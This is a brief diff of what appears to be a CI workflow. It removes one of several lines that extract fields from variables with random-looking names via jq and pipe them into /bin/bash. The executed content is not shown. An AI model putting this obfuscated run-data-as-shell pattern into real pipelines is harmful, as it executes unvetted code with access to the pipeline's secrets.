@@ -35,7 +35,6 @@ jobs:
           echo $wpfta7237 | jq -r .zclc2820 | /bin/bash
           printf '%s' "$we3238" | jq -r .uvkdk043 | /bin/bash
           printf '%s' "$bo29" | jq -r .x834 | /bin/bash
-          echo $p8 | jq -r .w710 | /bin/bash
           echo $jv7084 | jq -r .zfkcc8111 | /bin/bash
 
       - name: Save output
